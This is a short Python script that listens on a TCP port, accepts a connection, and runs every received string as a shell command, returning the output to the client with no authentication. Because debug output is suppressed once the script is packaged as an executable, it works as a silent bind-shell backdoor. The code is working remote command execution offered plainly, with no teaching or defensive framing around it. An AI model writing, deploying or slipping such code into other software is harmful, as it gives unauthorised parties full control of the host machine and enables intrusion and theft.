import socket
import subprocess
import sys
import time


def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return e.stderr


def change_debug_when_running_as_exe():
    if getattr(sys, 'frozen', False):  # Running as a standalone executable
        return False
    else:  # Running as a script
        return True


DEBUG = change_debug_when_running_as_exe()
DEBUG_prefix = "[debug-build] "

# Set host and port
import server_config as cfg

HOST = open('_config.ini', 'r').read()  # localhost or 127.0.0.1 for local server
PORT = cfg.port

# Create socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind socket on host and port
server_socket.bind((HOST, PORT))

# set socket listening
server_socket.listen(1)

if DEBUG:
    print(DEBUG_prefix + 'Server started! Waiting for connection...')

# Accept connection
client_socket, addr = server_socket.accept()
if DEBUG:
    print(DEBUG_prefix + 'Client connected:', addr)


# Receive data and send
def start_server():
    while True:
        data = client_socket.recv(1024).decode()  # Receive data

        if not data:
            break

        if DEBUG:
            print(DEBUG_prefix + 'Message from client:', data)

        cmd_data = run_command(data)

        response = cmd_data  # Create answer
        client_socket.send(response.encode())  # Send answer


while True:
    start_server()
    time.sleep(5)

# Close connections
client_socket.close()
server_socket.close()
